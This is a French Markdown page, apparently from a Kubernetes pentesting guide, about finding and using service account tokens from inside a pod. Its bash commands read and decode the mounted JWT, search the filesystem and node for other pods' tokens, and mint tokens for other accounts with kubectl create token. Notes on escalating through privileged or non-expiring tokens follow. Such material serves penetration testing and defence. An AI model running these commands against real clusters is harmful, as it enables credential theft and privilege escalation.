---
title: "Découverte de comptes de service et de jetons : trouver et utiliser les identités des pods"
order: 3
description: "Chaque pod s'exécute en tant que compte de service dont le jeton est monté dans celui-ci. Un attaquant décode le jeton monté pour apprendre son identité et son espace de noms, cherche d'autres jetons dans les secrets montés et sur le nœud, et utilise l'API TokenRequest là où c'est permis pour forger des jetons pour d'autres comptes de service, passant d'une identité à plusieurs."
keywords:
  - compte de service
  - jeton jwt
  - tokenrequest
  - identité kubernetes
  - découverte de jetons
---

# Découverte de comptes de service et de jetons

Un compte de service Kubernetes est l'identité sous laquelle un pod s'authentifie, et son jeton est un JWT signé monté à un chemin connu. La découverte comporte deux volets : comprendre le jeton que vous détenez déjà, et en trouver d'autres. Le jeton monté vous indique quel compte de service et quel espace de noms vous êtes, en décodant ses revendications ; d'autres jetons apparaissent dans d'autres secrets montés, dans les variables d'environnement, et, sur un nœud, dans le répertoire de jetons projetés de chaque pod.

## Comprendre le jeton que vous détenez

```bash
T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# decode the JWT payload to read the identity claims
echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# key claims: "kubernetes.io/serviceaccount/service-account.name",
# namespace, and for bound tokens the pod and expiry (exp)
```

## Trouver d'autres jetons

```bash
# secrets mounted into this pod that are themselves SA tokens
find / -maxdepth 8 -name token -path '*secret*' 2>/dev/null -exec sh -c \
  'echo "== $1 =="; cut -d. -f2 "$1" | base64 -d 2>/dev/null' _ {} \;
# on a node (if escaped): every pod's projected token
ls /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
# legacy non-expiring token secrets, if readable via the API (next page)
```

## Forger des jetons avec l'API TokenRequest

Si l'identité actuelle peut créer des demandes de jeton pour d'autres comptes de service, elle forge de nouveaux jetons pour eux :

```bash
kubectl create token <target-sa> -n <ns>                 # needs the right RBAC
# raw API equivalent: POST .../serviceaccounts/<sa>/token
```

Ceci est le volet énumération de [API TokenRequest](../rbac-privilege-escalation/tokenrequest-api.md) ; son fonctionnement dépend du RBAC que porte le jeton actuel.

## Notes d'exploitation

- Décoder la charge utile du JWT (le segment du milieu, en base64url) révèle le compte de service et l'espace de noms exacts, ce qui pilote chaque vérification `can-i` contre l'API.
- Les jetons liés portent un `exp` et sont rattachés au pod ; les jetons de secrets de type hérité n'expirent pas et sont plus précieux lorsqu'on les trouve, voir les voies d'abus de jetons.
- Sur un nœud, le jeton projeté d'un pod plus privilégié (par exemple un pod système ou de contrôleur) est une escalade directe ; l'accès au nœud rend le jeton de chaque pod lisible.

## Références

- [Kubernetes : volumes de jetons de compte de service](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#serviceaccount-token-volume-projection)
- [Kubernetes : API TokenRequest](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
- [HackTricks : Kubernetes tokens](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration)
